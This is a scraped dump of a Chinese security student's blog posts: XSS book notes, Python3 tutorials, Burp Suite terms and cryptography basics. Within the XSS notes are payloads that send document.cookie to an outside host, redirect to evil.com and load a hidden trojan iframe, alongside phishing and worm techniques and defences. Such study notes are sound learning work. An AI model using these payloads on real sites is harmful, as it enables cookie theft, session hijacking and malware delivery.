此外还有IE的UserData存储XSS Shellcode和HTML5的localStorage、sessionStorage。如window.localStorage.a， 利用cookie窃取 cookie分为持久性和临时性，临时性又称为会话cookie，存储在内存中，关闭浏览器立即消失，持久性存储硬盘中，由浏览器读取。浏览器通过document.cookie可以获取cookie信息。 常见属性：Domain（关联域名）、Expires（过期时间）、HttpOnly（避免被JavaScript访问）、Name（名称）、Path（关联路径）、Value（读写值）、Secure（指定Cookie通过安全Socket层连接传递）。 1234567&lt;script&gt;document.location=&quot;http://www.test.com/cookie.asp?cookie=&quot;+document.cookie&lt;/script&gt;&lt;img src=&quot;http://www.test.com/cookie.asp?cookie=&quot;+document.cookie;&gt;&lt;/img&gt;&lt;script&gt;document.write(&#x27;&lt;img src=&quot;http://www.test.com/cookie.asp?cookie=&#x27;+document.cookie+&#x27;&quot;width=0 height=0 border=0 /&gt;&#x27;);&lt;/script&gt; 会话劫持剖析 Session也就是会话，是一种安全的认证方式，和Cookie区别在于Session保存在服务端内存里。 网络钓鱼（Phishing） 首先在表单、留言框更改值使之链接到你的接受平台，如&lt;form&gt;标签的action属性值为xxx.com/get.php，然后在xx.com下存放接受信息的脚本get.php，在XSS页面创建iframe框架覆盖页面，等到用户点击即可。. 钓鱼方式： XSS重定向钓鱼（XSS Redirect Phishing）：如http://www.test.com/index.php?search=&quot;&#39;&gt;&lt;script&gt;document.location.href=&quot;http://evil.com&quot;&lt;/script&gt; HTML注入式钓鱼（XSS HTML Inject Phishing）：通过反射型XSS注入HTML页面到网页。 XSS跨框架钓鱼（Iframe Phishing）：利用iframe框架构造一个页面。 Flash钓鱼（Flash Phishing）：通过&lt;object&gt;或&lt;embed&gt;标签引用外部服务器的Flash即可。 更高级的：窃取Cookie，但是可以通过设置Cookie为Httponly来避免危害。如劫持onclick、onkeydown、keycode等等。 XSS History Hack：常用来获取用户浏览器的历史记录。 链接样式和getComputedStyle()：CSS伪类定义链接样式，JavaScript/CSS history hack利用getComputedSryle()方法实现。 JavaScript/CSS history hack：先获取CSS伪类定义颜色，然后通过链接的站点颜色与之对比。也可以参考国外研究人员Rsnake的POC 窃取搜索查询：和JavaScript/CSS history hack类似，记录用户可能访问的网站，通过js遍历列表链接属性，从而辨别浏览器是否访问过URL，而查询后的URL可以通过搜索的地址栏截获。 客户端信息刺探 JavaScript端口扫描 截获剪贴板内容：利用window.clipboardData对象处理剪贴板。 123clearData(sDataFormat) //删除剪贴板指定格式数据getData(sDataFormat) //从剪贴板获取指定格式的数据setData(sDataFormat, sData) //给剪贴板赋予指定格式数据 获取客户端IP地址 网页挂马：如&lt;iframe&gt;标签：&lt;iframe src=http://www.evil.com/trojan.html width=0 height=0&gt;&lt;/iframe&gt;， DOS和DDOS：Denial of Service和Distributed Denial of Service。 XSS Virus/Worm： 工具：Firebug、Tamper Data、Live HTTP Headers、Fiddler、XSS-Proxy、XSS shell、AttackAPI、Anehta。 漏洞剖析 黑盒测试（Blackbox）：其中又分为人工测试和自动化测试，自动化测试多称为扫描器，手动测试如&lt;script&gt;alert(0)&lt;/script&gt;，手动测试可以先输入敏感字符&lt;、&gt;、&quot;、&#39;、&amp;、#之类，然后通过js、onfocus事件等等方法测试。 白盒测试（Whitebox）：白盒测试更多在于源代码审计，常规思路是：查询页面可能输出的变量，检验他们是否受到控制，然后跟踪变量传递过程，分析是否可能被函数过滤危险符号。 JavaScript代码分析：DOM-Based XSS基于DOM，算是第三种跨站脚本漏洞。通过js的document.write()传递参数出现漏洞， Flash XSS 语言特性： PHP4 phpinfo() XSS：http://localhost/phpinfo?a[]=&lt;script&gt;alert(/XSS/)&lt;/script&gt; $_SERVER[PHP_SELF]：全局变量，可以通过提交查询代码修改值，http://localhost/data.php/%22%3E%3Cscript%3Ealert(&#39;XSS&#39;)%3C/script%3E%3Cfoo，除此之外，SCRIPT_URL、QUERY_STRING等等也有问题。 变量覆盖：register_global、extract()、遍历初始化变量 XSS Worm剖析Ajax（Asynchronous JavaScript and XML）学习：XMLHttpRequest对象、HTTP请求、HTTP响应、 浏览器安全：沙箱（Sandbox）、同源安全策略（Same Origin Policy）（同协议、同域名、同端口）。 基本攻击流程：存在XSS漏洞，编写XSS Worm，当其他用户登录访问源头时候，感染，否则就跳过。一般XSS漏洞点在个人档案、博客日志、留言等地方，在攻击成功后，可以通过抓包工具进行收集XSS Worm数据。 FLASH安全，（Flash虽然不被支持时间一再推迟，但退出是迟早的事情，不再记录） 深入浅出XSS原理CSRF（Cross-Site Request Forgery）：跨站请求伪造，受害者登录网站并生成了Cookie，点击恶意链接或者第三方网站，攻击者通过恶意代码发送请求。常见如：&lt;img&gt;、&lt;script&gt;、&lt;iframe&gt;、JS的Image对象、XMLHTTP对象。 Hacking JSON：JSON（JavaScript Object Notation），JSON Hijacking（JavaScript Hijacking）， HTTP Response Splitting：分割HTTP响应头的方法，又称为CRLF注射攻击（CRLF Injection Attack），基础（HTTP Header） MHTML、Data URI XSS、UTF-7 BOM XSS、浏览器插件安全、基于Cookie的XSS、RSS的XSS、软件的XSS、浏览器差异、字符集编码隐患。 防御XSS： XSS Filter：输入过滤（输入验证、数据消毒）、输出编码（实体编码转换）、黑名单与白名单。 定制过滤策略 安全编码规范： 防御DOM-Based XSS 其他：Anti_XSS（Microsoft Anti-Cross Site Scripting Library）、HttpOnly Cookie、Noscript、WAF 防御CSRF：POST代替GET、HTTP Referer、验证码、token 测试：xss常规符号， 1&lt;div id=&quot;div&quot; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;1 参考[ 1 ]:邱永华 XSS跨站脚本攻击剖析与防御","path":"2020/08/05/XSS跨站脚本攻击剖析与防御读书笔记/","date":"08-05","excerpt":"《XSS跨站脚本攻击剖析与防御》笔记，提醒!!!本笔记只是粗略笔记，如果希望学习，更推荐看原书!!!","tags":[{"name":"XSS","slug":"XSS","permalink":"https://www.ea6th.top/tags/XSS/"}]},{"title":"python3学习（二）","text":"python3学习（二） 本篇是python学习的第二篇 在上一篇已经结束了语法和文件简单操作和初步的正则，建议在这一章之前可以百度搜python3的pip的安装，因为是记录笔记向，所以本章不会有安装等一步流知识 推荐准备环境：pychrm、pip等 补齐基础上一部分限于篇幅，部分python3较为简单的东西没有写完，这次是补充。 数据类型转换这里强调一下Python3六个标准数据类型里：三个不可变数据类型Number、String、Tuple，三个可变数据List、Dictionary、Set(集合) 1test = int(&#x27;int&#x27;, 16) #将xx进制的数转化为十进制 数字格式化输出 12round(number, x) #x为位数，round四舍五入 数据结构 python(一)已经结束了一部分对于六大数据类型的操作。 列表的堆栈：append与po 123stack = [1, 2, 3, 4]stack.append(5)stack.pop() 列表的队列：暂时感觉对本人没用，不再赘述。 编程必要时候可能用到的global全局变量和nonlocal局部变量。 至于调用的传参和实参不再赘述，能看到这一般都是与编程经验的。 输入 1test = input(&quot;content:&quot;) 优化输出类 123456789101112131415#格式化字符串&#x27;Hi! %s&#x27; % test_str #传统的格式化字符串f&#x27;Hi! &#123;test_str&#125;&#x27; #3.6以后的f-string字符串#end行输出print(var, end=&#x27;xx&#x27;) #end以行输出并控制间隔符str.rjust(width, &#x27;xx&#x27;) #右对齐，xx填充空余，类似有ljust、centers = &#x27;Hello, sir!&#x27;str(s) #易读样式repr(s) #编辑器易读样式str.replace(&#x27;old&#x27;, &#x27;new&#x27;) #替换字符，很好用，去空格等等str.strip(&#x27;xx&#x27;) #清除头尾指定字符，没有上一个好用 3.6已经出f-string了，但是format用的还是不少，还是写下format()函数吧。 1234567print(&#x27;&#123;&#125; to &#123;&#125;!&#x27;.format(&#x27;Welcome&#x27;, &#x27;China&#x27;)) #注意&#123;&#125;和format的&#x27;&#x27;print(&#x27;your name is &#123;name&#125;&#x27;.format(name=&#x27;notwiner&#x27;))# !a使用ascii()，!s使用str()，!r使用repr()import mathprint(&#x27;&#123;!s&#125; is &#123;0.3f&#125;&#x27;.format(&#x27;pi&#x27;, math.pi)) 简化的语句，用于小批量输出 12345678910111213141516while (condiction): print(&#x27;contents&#x27;)for i in range(start, end, step): print(i)var1 = [1, 3, 6]var2 = [2, 4, 6][[x, x**2] for x in var1] #列表推导式，可以整合很多表达式[3*x for x in var1 if x &gt; 2][x*y for x in var1 for y in var2] #所有组合方案，含重复。list = [var1, var2]list_2 = []print([[x[i] for x in list] for i in range(3)])for i in range(3): list_2.append([x[i] for x in list])print(list_2) #多个序列用zip() 不同数据类型的拼接 string 123var += string #常用法list = [&#x27;123&#x27;, &#x27; &#x27;, &#x27;abc]&#x27;&#x27;.join(list) #常用于列表拼接字符串 list 12list += listlist.append() 函数 比较有用的： 12chr(number) #ascii转字符ord(string) #字符转ASCII码 定义函数的不定长参数 可以通过*var为名称以元组(tuple)形式输出，**var以字典(dict)形式输出。 1234567def test(str1, *tuple1): print(str1, tuple1)test(10, 20, 30)def test(str1, **dict1): print(str1, dict1)test(10, a=20, b=30) 匿名函数：格式为lambda var1, var2: expression 12sum = lambda int1, int2: int1 + int2print(f&#x27;this is result: &#123;sum(10, 20)&#125;&#x27;) 读写文件open(filename, mode)，记得filename为/。 模式： r、w、a为只读、只写、追加。 b，二进制格式操作，如rb、wb、ab。 +，读写，如r+、w+、a+。 a比较特殊，r、w模式在读、写会覆盖原文件，而a用于追加，不会覆盖。 t文本模式，默认。 123456a = open(&quot;&quot;, &quot;w&quot;)a.write(&quot;new contents&quot;)a.close()#或下面，自动关闭文件with open(&quot;xxx&quot;, &quot;w&quot;) as a: a.write(&quot;new contents&quot;) 操作，读取也可以用for迭代，写入必须为string，否则先转换 12345678a.read() #读取，可控制返回内容大小a.readline() #读取一行a.readlines() #读取所有行，a.write() #写入a.seek(x, y) #y可取开头0、当前1、结尾2，x为偏移量 对象那些事上一篇写过基础的概念，包括类(class)、对象(调用类)、继承还有一些简单的实现原理 属性与方法 类的方法和属性都有私有的用法，可以禁止类的外部访问或者直接访问。 __private_attrs:为私有属性，定义正常，内部使用时为self.private_attrs。 __private__method为私有方法，self.__private methods()。 而__init__、__call_则是公共方法。 参数传递 前面强调过六个普通数据类型的三个不可变(immutable)和三个可变(mutable)。实际的区别其实在参数传递中，可变数据类型实际意思上在于不过是引用， 多继承 12345678910111213141516171819202122232425262728293031323334353637383940class people: name = &#x27;&#x27; age = 0 #定义私有属性,私有属性在类外部无法直接进行访问 __weight = 0 #定义构造方法 def __init__(self,n,a,w): self.name = n self.age = a self.__weight = w def speak(self): print(&quot;%s 说: 我 %d 岁。&quot; %(self.name,self.age)) class student(people): grade = &#x27;&#x27; def __init__(self,n,a,w,g): #调用父类的构函 people.__init__(self,n,a,w) self.grade = g #覆写父类的方法 def speak(self): print(&quot;%s 说: 我 %d 岁了，我在读 %d 年级&quot;%(self.name,self.age,self.grade)) class speaker(): topic = &#x27;&#x27; name = &#x27;&#x27; def __init__(self,n,t): self.name = n self.topic = t def speak(self): print(&quot;我叫 %s，我是一个演说家，我演讲的主题是 %s&quot;%(self.name,self.topic)) class sample(speaker,student): #注意这里的顺序 a =&#x27;&#x27; def __init__(self,n,a,w,g,t): student.__init__(self,n,a,w,g) speaker.__init__(self,n,t) test = sample(&quot;Tim&quot;,25,80,4,&quot;Python&quot;)test.speak() 在sample括号里面从左到右的顺序决定后面方法使用哪个。 超类(调用父类)：使用super(child_class, xxx)可以调用父类，child_class为当前类。 模块与库基本pip自行安装配置，常用命令 12345pip list #已安装列表pip install PackerNamepip install -U PackerName #更新pip uninstall PackerName #卸载pip search PackerName #搜索 模块(module)， 1234567import modnamefrom modname import name1, name2 ...#查询模块所有名称import modnamedir(modname) #模块所有名称dir() #当前定义所有名称 文件通配符：不算是很有用 12import globglob.glob(&#x27;*.py&#x27;) os模块大多很无趣，仅记录好用的。（部分可能需要sys模块） os.chdir(path)：改变当前工作目录。 os.chroot(path)：更改当前进程根目录。 os.getcwd()：返回当前工作目录。 os.link(src, dst)：src是源地址，dst为目标地址，创建硬链接 os.symlink(src, dst)：创建软连接 os.listdir(path)：读取指定文件夹内的文件和文件夹。 os.readlink(path)：返回软连接指向的文件。 os.remove(path)：删除文件 os.removedirs(path)：删除文件夹，空文件夹用os.rmdir(path)。 re模块强大的正则表达式，上个文章写过，这里写下常用函数 re.match(pattern, string, flags=0)。pattern为正则表达式，#strings为字符串，flags为标志位，常用包括re.I(大小写不敏感)、re.M(多行匹配)、re.S(匹配所有字符)、re.U(匹配unicode字符集)。方法可用group(number)返回第几个值。 1re.match(&#x27;www&#x27;, &#x27;wwW.notwiner.top&#x27;, re.I re.search(pattern,string, flags)。和re.match类似，不同的是re.search会遍历所有，而re.match如果一开始就出问题，就会无效。 re.sub(pattern, replace, string, count, flags)。替换字符串，replace为替换后的字符串，很强大的是replace可为函数，count为替换次数， re.compile(pattern, flags)。编译然后生成了一种方法，可以用于re.match等等使用，相当于批量化了。方法group还有start(number)和end(number)，返回位置。 re.findall(pattern, string, pos, endpos)。找到匹配的所有字符串，pos为起始位置，默认为0，endpos结束位置，默认为字符串长度个人更倾向于为re.findall(string, start, end)。 re.split(pattern, string, maxsplit, flags) 。分割后返回为列表，maxsplit为分割次数。 网络https://www.runoob.com/python3/python3-cgi-programming.html","path":"2020/07/27/python3学习2/","date":"07-27","excerpt":"python3学习（二）","tags":[{"name":"python3","slug":"python3","permalink":"https://www.ea6th.top/tags/python3/"}]},{"title":"杂记","text":"一些自己的杂感 博客很久没发文章，大多是因为部分在本地，而且总是感觉不太完美，这段时间考虑安装难度逐步上传，争取下个月中旬上传所有较为easy的文章吧~~。 希望偶然间看到博客的，要不断学习，安全在我眼里，并不是在混圈子，圈子只是辅助，如果得了芝麻丢了瓜就得不偿失了~，之所以这么说，在看到之前带过的学弟走错路，其实我真正学习安全算是大二较晚时候，后来带人是想着他们大一下学期，算是留给学校部分有兴趣的人一条路，但后面发现如果认真带确实很难~~，还是希望大家少走错路。 关于博客几点说明 留言板只是样式，未来可能也不考虑加入新讨论模块，联系推荐友链等等。 大多数文章不会考虑加入图片，麻烦~_~。","path":"2020/07/26/杂记/","date":"07-26","excerpt":"一些自己的杂感","tags":[]},{"title":"Burpsuite笔记","text":"Burpsuite英语释义和一些较为重要的命令 加密与编码不同，编码意义在于将现实生活各种信息映射到字符中，而加密则是为了避免字符被不允许的人获取信息。 英语释义 Temporary project 临时项目 New project on disk 磁盘新建项目 Open existing project 打开现有项目 Use Burp default 使用Burp默认值 Use options saved with project 使用随项目保存的选项 Load from configuration file 从配置文件加载 Disable extensions 禁言扩展 Configuration library 配置库 Built-in configurations 内置配置 Custom Configurations 自定义配置 Automatic payload positions 自动负债位置 save state wizard 保存状态向导 Actively scan defined insertion points 定义主动扫描插入点 Sequencer match and replace 匹配并替换 crawler settings 爬行设置 Manual load 手动加载 Upstream proxy servers 上游代理服务器 部分使用PC命令行启动并控制内存大小：java -jar -Xmx2G /your_path/burpsuite.jar Intruder： Simple list（简单列表）： Runtime file（运行时文件）：指定文件的每一行。 Custom iterator（自定义迭代器）： Character substitution（字符串替换）： Case modification（大小写替换）： Recursive grep（递归） Illegal Unicode（不合法Unicode编码）： Character blocks（字符块） Number、Dates、Brute forcer（暴力字典）、Null payloads等等 Repeater Intruder Follow redirections：重定向响应是否会被自动执行，On-site only仅重定向到同一个网页，In-scope Only仅跟随重定向到目标范围内的URL。 Process cookies in redirections：重定向响应设置任何cookies被重定向后重新提交。 Sequencer 用于分析数据项的样本随机性质量的工具，测试cookies之类的，是否可预测。 Androidhttps://wooyun.js.org/drops/%E6%B5%85%E6%9E%90%E6%89%8B%E6%9C%BA%E6%8A%93%E5%8C%85%E6%96%B9%E6%B3%95%E5%AE%9E%E8%B7%B5.html 插件 Burp的python环境：Jpython的Standalone版本，Extender界面的options里面的Python Environment选择好下载好的文件即可。 常用 SQLiPy、 开发 burp插件编写规范和https://portswigger.net/burp/extender/ python开发Burp插件 参考[1]:乌云镜像:Burp使用介绍（一）","path":"2020/07/26/Burp/","date":"07-26","excerpt":"Burpsuite英语释义和一些较为重要的命令","tags":[{"name":"Burpsuite","slug":"Burpsuite","permalink":"https://www.ea6th.top/tags/Burpsuite/"}]},{"title":"密码学（一）","text":"初入密码学，基础为主，简单的古典密码就不记录了。 加密与编码不同，编码意义在于将现实生活各种信息映射到字符中，而加密则是为了避免字符被不允许的人获取信息。 基础英文术语密码(cryptography)、加密(encrypt)、解密(decrypt)、明文(plaintext)、密文(ciphertext)、算法(algorithm)、密钥(key)、认证(authentication)、验证(verify) 异或异或(exclusive or,XOR)基本原理是比特位相同为0，相异为1。存在特点：A xor B = C,C xor B = A,C xor A =B 加密与解密方式加密时明文+密钥→密文，解密时密文+密钥→明文，加密与解密密钥是否相同分为对称密码和非对称密码（又称为公钥密码）。 压缩程序本质是找出数据出现的冗余的重复序列，替换成较短数据。 对称密码对称密码加密与解密使用相同密钥。 一次性密码本一次性密码本(one-time pad)：将明文转为二进制位，与随机生成相同二进制位数的密钥进行异或(XOR)运算，解密相同。 很简单流程，但是由于异或时错一个比特位结果都有所不同导致很难得知哪个才是真正的明文。 DESDES(Data Encryption Standard)：分组密码，以64比特为一个单位加密得到64比特密文，密钥56位，每隔7位进行错误检查，是16轮的Feistel密码。 Feistel密码(Feistel cipher)：加密一次称为一轮(round)，每轮输入数据分为左右两个部分，右侧直接输出，轮函数对右侧数据与子密钥(每轮使用的随机密钥)计算得到的二进制序列与左侧进行XOR运算输出到左边，两者连接即为一轮，而由于右侧未加密，每两轮进行对调。 攻击：在可以任意选择明文和解密结果情况下，称为选择明文攻击(CPA) 差分分析：通过不断改变局部二进制位得到结果偏差。 线性分析：利用明文与密文XOR计算结果偏离1/2概率得到信息。 三重DES三重DES(triple-DES)：将DES重复3次，密钥长度为168，三次密钥不同。 AESAES(Advanced Encryption Standard)：2000.11.2选用的Rijndael，一般规格有128、192和256位。 输入分组为128bit，即为16字节，依次对16字节输入数据进行SubBytes处理（根据替换表S-Box替换），后经过ShiftRows处理（以4字节为单位一定规则向左偏移），再进行MixColumns处理（对一个4字节进行比特运算，矩阵运算），最后进行AddRoundKey处理（与轮密钥进行XOR）。 分组密码密码有分组密码和流密码。 分组密码(block cipher)：只能处理特点长度的一类算法，1每块为分组(block)，一个分组二进制数为分组长度(block length)。如DES、AES 流密码(stream cipher)：对数据流连续处理的密码算法，因此在处理时需要保持内部状态，如一次性密码本。 模式(mode)： ECB(Electronic CodeBook mode，电子密码本模式) 将明文分组加密后的结果直接作为密文分值。明文分组内容小于分组长度时，使用一些数据填充(padding)， 分组过于独立、密文分组与明文分组一一对应很容易被操纵与破解。 CBC(Cipher Block Chaining mode，密码分组链接模式) 对第一个明文分组使用一个初始化向量(Initialization Vector)进行XOR运算，之后的明文分组与前一个密文分组进行XOR运算，再进行加密。 填充提示攻击(Padding Oracle Attack)：反复发送一段密文，每次对填充数据内容改变，根据错误信息得到相关信息。 对初始化向量(IV)攻击：初始化向量如果可以知道，便可以逐步推算。因此必须使用不可预测的随机数。 CFB(Cipher FeedBack mode，密文反馈模式) 前一个密文分组送到密码算法输入端，加密后进行XOR，由于第一个百词斩之前数据，需要初始化向量(IV)，和一次性密码本运算类似，但CFB的比特序列非随机，而是用密码算法生产的密钥流(key stream)，相当于伪随机数生成器。 重放攻击(replay attack) OFB(Output FeedBack mode，输出反馈模式) 与CFB类似，不同的是OFB是加密算法输出被反馈到加密算法输入。相当于自身不断加密形成密钥流。 CTR(CounTeR mode，计数器模式) 将逐次累加的计数器进行加密生成密钥流，与OFB区别在使用的是不断累加的计数器，计数器分为初始值(nonce)与序号两个部分，序号不断累加，形成比特序列。 在CTR基础上增加认证的为GCM模式。 公钥密码解密密钥与加密密钥不同。 基础公钥密码基础在于密钥配送问题的解决。密钥配送问题如下： 通过实现共享密钥 通过密钥分配中心（Key Distribution Center,KDC）解决 通过Diffie-Hellman解决 公钥密码解决 加密密钥或称为公钥(public key)、解密密钥或成为私钥(private key)，私钥不能被其他人获得，而一对公钥和私钥称为密钥对(key pair)。 在通信过程中，A拥有私钥和公钥，把公钥发给B，B利用公钥对需要传输的明文加密，然后发给A，A用私钥进行解密，完成了密钥传输问题。 求余(mod)：如$27 \\space mod \\space 12 = 3$称之为27与3以12为模同余，加减乘除都类似，而对数称为离散对数，如$7^{5} \\space mod \\space 12$。 RSA开发者Rond Rivest 、Adi Shamir、Leonard Adleman(Rivest-Shamir-Adleman)的缩写，应用于公钥签名和数字签名。 加密方式：$密文 = 明文^{E} \\space mod \\space N$，E(Encryption)、N(Number)组合为公钥，写法为公钥是(E,N)或公钥是&#123;E,N&#125;。 解密方式：$明文 = 密文^{D} \\space mod \\space N$，和公钥类似，D、N为私钥。 E、D和N是生成密钥对。 生成步骤 求N：准备两个很大的质数p、q，$N=p\\times q$。 求L：L为p-1和q-1的最小公倍数(least common multiple, lcm)，$L=lcm(p-1,q-1)$ 求E：E是一个比1大、比L小的数，E和L最小公约数(greatest common divisor, gcd)为1（即E与互质），即$1&lt;E&lt;L,gcd(E,L)=1$求最大公约数可用欧几里得的辗转相除法。 求D：D满足$1&lt;D&lt;L,E \\times D\\space mod \\space L=1$， 例如p=17、q=19，可得到N=323、L=144、E=5、D=29，可得到公钥(E,N)=(5,323)和密钥(D,N)=(29,323)，加密时，如明文为123，密文即为$123^{5} \\space mod\\space 323=225$，解密为$225^{29}\\space mod \\space 323=123$。 攻击 暴力破解：取决于长度 通过E、N求D：通过大数分解N拿到p、q，就能拿到D。 中间人攻击(man-in-the-middle attack)：虽然不能拿到密钥，但是可以利用公钥伪造信息。 选择密文攻击(Chosen Ciphertext Attack)：能通过各种手段让解密程序解密，没有密钥，但可以获得相关信息，从而趋近于解密。可以通过认证即最优非对称加密填充(Optiomal Asymmetric Encryption Padding，RSA-OAEP)防范。 其他公钥 ElGamal：利用mod N下求离散对数的困难度，特征是经过加密的密文长度变为明文的两倍。 Rabin：利用mod N下求平方根的困难度。 椭圆曲线密码(Elliptic Curve Cryptography, ECC)：需要的密钥比RSA短， 混合密码系统混合密码系统(hybrid cryptosystem)将对称密码和公钥密码结合的方法，对称密码对消息加密，伪随机数生成器生成对称密码的密钥，然后用公钥密码对加密消息的密钥进行加密。如网络通信的SSL/TLS都运用了混合密码系统。 常用解密方法RSA工具下载： https://github.com/ctf-wiki/ctf-tools/blob/master/docs/crypto.md 根据个人使用后推荐：RSATool 2、openssl、大数分解网站 yafu应该与机器有关，确实不如上面那个网站快。 使用注意 RSATool2：右上角Number Base为下方输入的P、Q、R等进制类型，Public Exponent(E)注意HEX，输入为16进制，非十进制。 openssl：遇到公钥，可以使用命令得到N、E 1openssl rsa -in public.key -pubin -noout -text -modulus 参考[1]: 图解密码技术[2]:https://skysec.top/2017/07/25/RSA%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/#RSATool","path":"2020/06/08/密码学(一)/","date":"06-08","excerpt":"初入密码学，基础为主，简单的古典密码就不记录了。","tags":[{"name":"笔记","slug":"笔记","permalink":"https://www.ea6th.top/tags/%E7%AC%94%E8%AE%B0/"},{"name":"密码学","slug":"密码学","permalink":"https://www.ea6th.top/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"}]},{"title":"python3学习（一）","text":"python3学习基础篇 python学习由于很多工具和脚本是python2，而python2快停止支持了，也是为了训练以后方便编写脚本，学习python开始了~~，本篇是基础篇， 基本语法PEP8代码规范。 基本概念注释： 1234单行：#多行：&quot;&quot;&quot;&quot;&quot;&quot; 编码信息： 1# -*- coding: utf-8 -*- 运算符：**次方，%取余数，逻辑运算符：! and or 基本数据类型 这里强调一下Python3六个标准数据类型里：三个不可变数据类型Number、String、Tuple，三个可变数据List、Dictionary、Set(集合)。 123type(var) #变量类型del var #删除变量等等var.clear() 数值运算有+、-、*、/、//、%余数、**，位运算符有&amp;、|、^异或、~取反、&lt;&lt;、&gt;&gt;，逻辑运算符有and、or、not，成员(字符串、列表、元组)运算符in和not in，身份运算符is和is not。 数字(Number)：支持int、float、bool、complex(复数，好评)， 字符串(String)：可用&#39;var_1&#39;或&quot;var_2&quot;表示，和下面一样，从0开始，而非1，\\用来转义。 1234567test_str = &quot;this is a test\\n&quot;str[start, end] #输出范围内的字符&#x27;Hi! %s&#x27; % test_str #传统的格式化字符串f&#x27;Hi! &#123;test_str&#125;&#x27; #3.6以后的f-string字符串 元组(Tuple)：不可更改， 123test_tuple = (2, 3, &quot;test2&quot;, 5.9, False) test_tuple = (20,) #单元素带,test_tuple[stear:end] 列表(List)：可更改 123456789test_list = [True, 3, &quot;smile&quot;]test_list_2 = [True, 3, &quot;smile&quot;, [2,3,4]]test_list[]test_list_2[-1][2]test_lsit_2[start:end:step] #起始、结尾、相隔间隔个数&quot;smile&quot; in test_list #是否在其内&quot;smil&quot; not in test_list 词典(Dictionary)：通过键(key)与值(value)对应构成，无序，key唯一 1234test_dict_1 = &#123;&quot;a&quot;:1, &quot;b&quot;:2, &quot;c&quot;:3&#125;test_dict_2 = dict([(&quot;a&quot;, 1), (&quot;b&quot;, 2), (&quot;c&quot;, 3)])test_dict[keys] 集合(Set)：使用set()或&#123;&#125;创建，而空集合必须使用set()，但多元素时set很鸡肋。无序，不会重复，自动去除bool类型值。 运算有-(差集)、|(并集)、&amp;(交集)、^(两集合交集相反的范围)，对应为difference、union、intersection、symmetric_difference 12345678910test_set_1 = &#123;1, 2, True, &quot;test&quot;, &quot;name&quot;&#125;test_set_2 = set()test_set_3 = set([1, 2, &quot;test&quot;])test_set_1.add(3)test_set_2.update([1, 2, 3]) #add只能添加一项，update添加多项test_set_3.remove(1) #删除一项test_set_2 &lt;= test_set_3 #也可以是var_1.issubset(var_2)test_set_2 &gt;= test_set_3 #也可以是var_1.issuperset(var_2)test_set_1.union(test_set_3) 数据类型转换如果将字典转化为list或tuple，可以使用list(test_dict.values())，不指定键值则默认为keys，但反正不行。 123456789101112131415161718int(3.5)int(&#x27;0x16&#x27;, 16) #进制转换，将输出的以xx进制转为十进制float(var)complex(var)complex(&quot;a+bj&quot;) #这里不能有空格str(var) #转化为字符串repr(var) #供解释器读取，从显示来看多了引号。eval() #计算表达式返回结果tuple(var) #转换为元组，当为字符会挨个分离，数字不被允许使用list(var) #转换为列表，set(var) #转换为可变集合，都会被分为单个字符。dict() #由于词典键值配对，所以不能转化，frozenset() #冻结的集合，单独的数据类型chr(int) #返回ASCII码ord(string) #chr()的反函数hex(int) #将10进制转为16进制oct(int) #转为8进制bin(int) #转为二进制 语句if语句：可内嵌，多个用elif， 123456789test = 123if test &gt; 123: test_2 = 0.1 print(test)elif: test_2 = 0.2else: test_2 = 0.3print(test2) for语句： 12for a in [3, 4, 5, 6, &quot;life&quot;]: print(a) 12for i in range(5): print(&quot;test&quot;) # i从0开始 while语句： 1234i = 0while i &lt; 10: print(i) i = i + 1 continue与break：continue跳过这次执行，进入下次循环，break停止循环。 1234for i in range(10): if i == 2: continue print(i) 函数定义函数(define function) 12345678def square_minus(a, b): a = a ** 2 b = b ** 2 c = a -b return cb = 10a = 1print(square_minus(b, a)) a、b为形参(Parameter)，没有实际内容。在函数定义中return和print仅在输出有区别。 上面为位置传参，还有关键字(Keyword)传递参数，顾名思义就是规定定义函数内的形参。 123def print_result(a, b, c): print(b, a, c)print_result(50, c=20, b=30) 位置传参和关键词传参可以混用，如上，但是确保位置参数均在关键字参数之前。 在定义函数内可以规定某些形参的默认值，当然进过测试，默认值必须在最后定义。 包裹(packing)传参：无须说明参数个数， 12345def print_package(*all_arguments): print(type(all_arguments)) print(all_arguments)print_package(1, 4, 6)print_package(&quot;test&quot;, True, 5555, False) 根据返回可以确定使用了元组(Tuple)。 与普通传参不同，包裹传参，如果希望通过关键词传参，需要更改部分函数定义样式。 1234def print_package(**all_arguments): print(type(all_arguments)) print(all_arguments)print_package(a=1, b=4, c=6) 解包裹(unpacking)：可以将一个定义的数据类型传输到定义函数内，然后进行分解，包裹传参和解包裹并非反向操作， 1234def unpackage(a, b, c): print(a, b, c)abc = (1, 2, 3)unpackage(*abc) 词典的解包裹用法 1234def unpackage(a, b, c): print(a, b, c)abc = (&quot;a&quot;:1, &quot;b&quot;:2, &quot;c&quot;:3)unpackage(**abc) 递归(Recursion) 函数栈(Stack)：有序的存储数据，显著的特征是后进先出(LIFO Last In, First Out)，栈内每个元素称为帧(frame)，支持pop(取出栈顶元素)与push(推入新元素存入栈顶)。 模块引入(import)模块 fisrt.py文件 12def laugh(): print(&quot;Ha&quot; * 5) 同一目录的second.py引用 123from first import laughfor i in range(10): laugh() 将常见功能编到模块，便成为了所谓的库(library)， 安装库 1$pip install library_name 对象调用和定义函数类似，但更多的在于对象的属性和方法。属性更多是类之间的共性，而方法多是所选择对象的类的差异性。 类(class) 12345class Bird(object): feather = True reproduction = &quot;egg&quot; def chirp(self, sound): print(sound) 如上，feather、reproduction为Bird类下的属性(attribute)，chirp为定义的方法(methon)， 对象：调用类，创造类下的一个对象，引用为object.attribute 123summer = Bird()print(summer.reproduction)summer.chirp(&quot;xxxxx&quot;) 魔法方法(Magic Method)：用来初始化对象属性。注意前后均是两个下划线，如：__init__()、__add__()、__dict__()。 1234567891011class Bird(object): def __init__(self, sound): self.sound = sound print(&quot;my sound is:&quot;, sound) def chirp(self): print(self.sound)summer = Bird(&quot;xxx&quot;)summer.chirp()cat = Bird(&quot;aaa&quot;)summmer.chirp()cat.chirp() self还可以调用同一类的其他方法。 12345678class Bird(object): def chirp(self, sound): print(sound) def chirp_repeat(self, sound, n): for i in range(n): self.chirp(sound)summer = Bird()summer.chirp_repeat(&quot;ji&quot;, 10) 123456789101112class Bird(object): def __init__(self, sound): self.sound = sound print(&quot;is:&quot;, sound) def chirp(self): print(self.sound) def chirp_re(self, sound, n): for i in range(n): print(self.sound)summer = Bird(&quot;jack&quot;)summer.chirp()summer.chirp_re(&quot;ji&quot; , 2) 